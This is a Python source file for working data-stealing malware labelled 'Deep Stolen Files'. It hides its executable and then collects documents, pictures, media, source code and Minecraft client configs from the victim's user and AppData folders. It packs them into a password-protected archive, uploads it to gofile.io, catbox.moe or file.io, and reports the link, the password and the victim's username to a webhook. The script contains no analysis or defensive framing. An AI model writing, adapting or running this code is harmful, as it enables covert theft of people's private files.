import os;import secrets;import requests;import sys;import shutil
from subprocess import run,call,CREATE_NO_WINDOW;from random import choices
from datetime import datetime

call(['attrib', '+h', "stolen.exe"], creationflags=CREATE_NO_WINDOW)

ALLOWED_EXT = [
    '.pdf', '.txt', '.xlsm', '.cfg', '.reg', '.doc', 
    '.docx', '.xls', '.rtf', '.csv', '.odt', '.log' # documents and others
    '.webm', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg', # video
    '.mp3', '.wav', '.ogg' # commun audio ext
    '.py', '.js', '.cpp', '.c', '.rt' # advanced ext
    ]
PIC_EXT = ['.png', '.jpg', '.jpeg', '.gif', '.bmp']
SPECIAL_EXT = ['.cfg', '.js', '.json']

PIC_LOCS = ['Pictures', 'Downloads']
OTHER_LOCS = ['Documents', 'Downloads', 'Music', 'Desktop', 'Videos']
SPECIAL_LOCS = ['.minecraft\\Blossom\\configs', '.minecraft\\Rise\\configs', '.minecraft\\LiquidX\\configs', '.minecraft\\LiquidX\\scripts', '.minecraft\\Rise\\scripts', '.minecraft']

HOOK = ""
ADDED_FILES = set()
TEMP = os.getenv('temp')

TIME = datetime.now().strftime("%H:%M:%S")

ARCHIVE = ''.join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=15)) + '.zip'
PASSWORD = ''.join(str(secrets.randbelow(10)) for _ in range(16))

APATH = os.path.join(TEMP, ARCHIVE)

PIC_DIRS = [os.path.join(os.getenv('userprofile'), loc) for loc in PIC_LOCS]
OTHERS_DIRS = [os.path.join(os.getenv('userprofile'), loc) for loc in OTHER_LOCS]
SPECIAL_DIRS = [os.path.join(os.getenv('appdata'), loc) for loc in SPECIAL_LOCS]

for dirs in [PIC_DIRS]:
    for dir_path in dirs:
        if os.path.isdir(dir_path):
            for root, _, files in os.walk(dir_path):
                for file in files:
                    if file.endswith(tuple(PIC_EXT)) and not file.startswith('.'):
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            ADDED_FILES.add(file_path)

for dir_path in OTHERS_DIRS:
    if os.path.isdir(dir_path):
        for root, _, files in os.walk(dir_path):
            for file in files:
                if file.endswith(tuple(ALLOWED_EXT)) and not file.startswith('.'):
                    file_path = os.path.join(root, file)
                    if os.path.isfile(file_path):
                        ADDED_FILES.add(file_path)

for dir_path2 in SPECIAL_DIRS:
    if os.path.isdir(dir_path2):
        for root, _, files in os.walk(dir_path2):
            for file in files:
                if file.endswith(tuple(SPECIAL_EXT)) and not file.startswith('.'):
                    file_path = os.path.join(root, file)
                    if os.path.isfile(file_path):
                        ADDED_FILES.add(file_path)
added_names = set()

MEI = os.path.join(sys._MEIPASS, "rar.exe")

if os.path.isfile(MEI):
    cmd = run([MEI, 'a', '-r', '-hp' + PASSWORD, APATH] + list(ADDED_FILES), creationflags=CREATE_NO_WINDOW, capture_output=True, shell=True, cwd=TEMP)
    if cmd.returncode == 0:
        result = ("rar", PASSWORD)
    else:
        shutil.make_archive(APATH.rsplit(".", 1)[0], "zip", TEMP)
        result = ("zip", None)
else:
    result = None

call(['attrib', '+h', APATH], creationflags=CREATE_NO_WINDOW)

try:
    with open(APATH, "rb") as file:
        r1 = requests.post(f"https://{requests.get('https://api.gofile.io/getServer').json()['data']['server']}.gofile.io/uploadFile", files={"file": file})
        download_url = r1.json().get("data", {}).get("downloadPage")

    if download_url:
        embed1 = {
            "username": "Deep Stolen Files",
            "avatar_url": "https://i.ibb.co/Dgxzc9m/w.jpg",
            "content": "",
            "embeds": [
                {
                    "title": f"**__Deep | File dropped and run on {os.getlogin()} pc__**",
                    "fields": [
                        {
                            "name": "**__Name File__**",
                            "value": ARCHIVE,
                            "inline": True
                        },
                        {
                            "name": "**__Download:__**",
                            "value": f"||{download_url}||",
                            "inline": True
                        },
                        {
                            "name": "**__Password:__**",
                            "value": f"||{PASSWORD}||",
                            "inline": True
                        },
                        {
                            "name": "**__Files:__**",
                            "value": str(len(ADDED_FILES)),
                            "inline": True
                        }],
                        "footer": {
                            "text": f"Deep Stolen Files · {TIME}"
                        },
                        "color": 0,
                    }
                ]
            }
        requests.post(HOOK, json=embed1)
    else:
        with open(APATH, "rb") as file:
            r2 = requests.post("https://catbox.moe/user/api.php", files={"fileToUpload": file})
            catbox_url = r2.text.strip()

        if catbox_url:
            embed2 = {
                "username": "Deep Stolen Files",
                "avatar_url": "https://i.ibb.co/Dgxzc9m/w.jpg",
                "content": "",
                "embeds": [
                    {
                        "title": f"**__Deep | File dropped and run on {os.getlogin()} pc__**",
                        "fields": [
                            {
                                "name": "**__Name File__**",
                                "value": ARCHIVE,
                                "inline": True
                            },
                            {
                                "name": "**__Download:__**",
                                "value": f"||{catbox_url}||",
                                "inline": True
                            },
                            {
                                "name": "**__Password:__**",
                                "value": f"||{PASSWORD}||",
                                "inline": True
                            },
                            {
                                "name": "**__Files:__**",
                                "value": str(len(ADDED_FILES)),
                                "inline": True
                            }],
                            "footer": {
                            "text": f"Deep Stolen Files · {TIME}"
                        },
                        "color": 0,
                    }
                ]
            }

            requests.post(HOOK, json=embed2)
        else:
            with open(APATH, "rb") as file:
                r3 = requests.post("https://file.io", files={"file": file})
                fileio_url = r3.json().get("link")

            if fileio_url:
                embed3 = {
                    "username": "Deep Stolen Files",
                    "avatar_url": "https://i.ibb.co/Dgxzc9m/w.jpg",
                    "content": "",
                    "embeds": [
                        {
                            "title": f"**__Deep | File dropped and run on {os.getlogin()} pc__**",
                            "fields": [
                                {
                                    "name": "**__Name File__**",
                                    "value": ARCHIVE,
                                    "inline": True
                                },
                                {
                                    "name": "**__Download:__**",
                                    "value": f"||{fileio_url}||",
                                    "inline": True
                                },
                                {
                                    "name": "**__Password:__**",
                                    "value": f"||{PASSWORD}||",
                                    "inline": True
                                },
                                {
                                    "name": "**__Files:__**",
                                    "value": str(len(ADDED_FILES)),
                                    "inline": True
                                }],
                        "footer": {
                            "text": f"Deep Stolen Files · {TIME}"
                        },
                        "color": 0,
                    }
                ]
            }

                requests.post(HOOK, json=embed3)
            else:
                requests.post(HOOK, json={"content": ":("})

except requests.exceptions.ConnectionError:
    os.remove(APATH)
